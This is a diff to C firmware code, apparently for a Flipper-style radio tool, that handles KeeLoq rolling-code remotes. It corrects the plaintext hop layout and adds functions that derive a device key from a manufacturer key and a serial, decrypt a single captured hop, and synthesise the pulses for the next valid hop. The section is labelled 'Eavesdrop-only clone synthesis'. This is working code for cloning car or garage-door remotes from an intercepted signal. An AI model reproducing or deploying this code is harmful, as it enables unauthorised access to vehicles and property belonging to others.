@@ -372,7 +372,10 @@ static bool kl_try_one(KLFrame* f, const char* label, uint64_t mk, bool sn_div) 
     f->key     = dk;
     snprintf(f->device_key_hex, sizeof(f->device_key_hex),
              "%016llX", (unsigned long long)dk);
-    f->predict_window = 1024;
+    /* A recovered device key lets us synthesize a valid next hop, so the
+       advertised window is a true counter estimate. Keep it on the shared
+       KL_PREDICT_WINDOW constant. */
+    f->predict_window = KL_PREDICT_WINDOW;
     f->predict_lo = (f->cnt + 1) & 0xFFFF;
     f->predict_hi = (f->cnt + 16) & 0xFFFF;
     return true;
@@ -427,7 +430,15 @@ bool flipper_kl_next_pulses(const KLFrame* f, uint32_t ctr, uint64_t key,
     if(!f || !out || te < 100 || te > 4000) return false;
     memset(out, 0, sizeof(*out));
 
-    uint32_t plain = ((uint32_t)(f->btn & 0xF) << 28) | (ctr & 0xFFFF);
+    /* Build the plaintext the way a real HCS encoder does:
+         [31:28] = button  [27:26] = reserved(0)  [25:16] = 10-bit
+         discriminator (= SN[9:0])  [15:0] = counter.
+       The receiver decrypts to this layout and checks the discriminator against
+       the serial's low 10 bits; omitting it would make every synthesized hop
+       fail that check except for serials whose low 10 bits are already zero. */
+    uint32_t plain = ((uint32_t)(f->btn & 0xF) << 28) |
+                     ((f->sn & 0x3FFu) << 16) |
+                     (ctr & 0xFFFFu);
     uint32_t enc   = kl_encrypt(plain, key);
     if(!enc) return false;
 
@@ -463,6 +474,75 @@ bool flipper_kl_next_pulses(const KLFrame* f, uint32_t ctr, uint64_t key,
     d[n++] = te * 2;
     if(n > FLIPPER_PULSE_MAX) return false;
     out->len = n;
+    return true;
+}
+
+/* ── Eavesdrop-only clone synthesis ───────────────────────────────────────── */
+/* Secure-learning normal diversification (AN1064/AN1031). */
+bool kl_derive_device_key(uint64_t manufacturer_key, uint32_t serial,
+                          uint64_t* device_key) {
+    if(!device_key || manufacturer_key == 0 || manufacturer_key == UINT64_MAX)
+        return false;
+    uint64_t seed = (uint64_t)(serial & 0x0FFFFFFFu) |
+                    ((uint64_t)(serial & 0x0FFFFFFFu) << 28);
+    uint64_t lo = kl_encrypt((uint32_t)(seed & 0xFFFFFFFFu), manufacturer_key);
+    uint64_t hi = kl_encrypt((uint32_t)(seed >> 32), manufacturer_key);
+    *device_key = lo | (hi << 32);
+    return true;
+}
+
+bool flipper_kl_clone_next(const KLFrame* captured, uint64_t manufacturer_key,
+                           uint32_t te, float freq_mhz, FlipperPulseBuf* out,
+                           FlipperDecodeResult* out_decode) {
+    if(!captured || !out || captured->enc == 0 || captured->btn == 0)
+        return false;
+    if(manufacturer_key == 0 || manufacturer_key == UINT64_MAX) return false;
+    if(te < 100 || te > 4000) return false;
+
+    /* Derive the device key from the serial and manufacturer key. */
+    uint64_t dev;
+    if(!kl_derive_device_key(manufacturer_key, captured->sn, &dev))
+        return false;
+
+    /* Recover the plaintext counter from the captured hop. */
+    uint32_t plain = kl_decrypt(captured->enc, dev);
+    uint8_t  btn   = (uint8_t)((plain >> 28) & 0xFu);
+    uint32_t disc  = (plain >> 16) & 0x3FFu;
+    if(btn != captured->btn) return false;
+    if(disc != (captured->sn & 0x3FFu)) return false;
+    uint32_t cnt = plain & 0xFFFFu;
+
+    KLFrame next;
+    memset(&next, 0, sizeof(next));
+    next.sn  = captured->sn;
+    next.btn = captured->btn;
+    next.cnt = (cnt + 1u) & 0xFFFFu;
+
+    if(!flipper_kl_next_pulses(&next, next.cnt, dev, te, freq_mhz, out))
+        return false;
+
+    if(out_decode) {
+        memset(out_decode, 0, sizeof(*out_decode));
+        strncpy(out_decode->proto, "KeeLoq-Clone",
+                sizeof(out_decode->proto) - 1);
+        out_decode->addr  = captured->sn;
+        out_decode->cnt   = next.cnt;
+        out_decode->btn   = captured->btn;
+        out_decode->hop   = kl_encrypt(((uint32_t)(captured->btn & 0xF) << 28) |
+                              ((captured->sn & 0x3FFu) << 16) | next.cnt, dev);
+        out_decode->te_us = te;
+        out_decode->freq_mhz = freq_mhz;
+        out_decode->bits = 66;
+        out_decode->rolling = true;
+        snprintf(out_decode->device_key_hex,
+                 sizeof(out_decode->device_key_hex), "%016llX",
+                 (unsigned long long)dev);
+        out_decode->predict_window = KL_PREDICT_WINDOW;
+        out_decode->predict_lo = (next.cnt + 1) & 0xFFFFu;
+        out_decode->predict_hi = (next.cnt + 8) & 0xFFFFu;
+        snprintf(out_decode->predict_note, sizeof(out_decode->predict_note),
+                 "clone synth cnt=%lu", (unsigned long)next.cnt);
+    }
     return true;
 }
 
@@ -512,7 +592,9 @@ bool flipper_predict_keeloq_next(const FlipperDecodeResult* r, uint32_t offset,
         out_decode->addr = r->addr;
         out_decode->cnt = next_cnt;
         out_decode->btn = r->btn;
-        out_decode->hop = kl_encrypt(((uint32_t)(f.btn & 0xF) << 28) | next_cnt, key);
+        out_decode->hop = kl_encrypt(
+            ((uint32_t)(f.btn & 0xF) << 28) |
+            ((f.sn & 0x3FFu) << 16) | next_cnt, key);
         out_decode->te_us = te;
         out_decode->freq_mhz = r->freq_mhz;
         out_decode->bits = 66;
@@ -520,7 +602,7 @@ bool flipper_predict_keeloq_next(const FlipperDecodeResult* r, uint32_t offset,
         strncpy(out_decode->mfr_name, r->mfr_name, sizeof(out_decode->mfr_name) - 1);
         strncpy(out_decode->device_key_hex, r->device_key_hex,
                 sizeof(out_decode->device_key_hex) - 1);
-        out_decode->predict_window = 256;
+        out_decode->predict_window = KL_PREDICT_WINDOW;
         out_decode->predict_lo = (next_cnt + 1) & 0xFFFF;
         out_decode->predict_hi = (next_cnt + 8) & 0xFFFF;
         snprintf(out_decode->predict_note, sizeof(out_decode->predict_note),
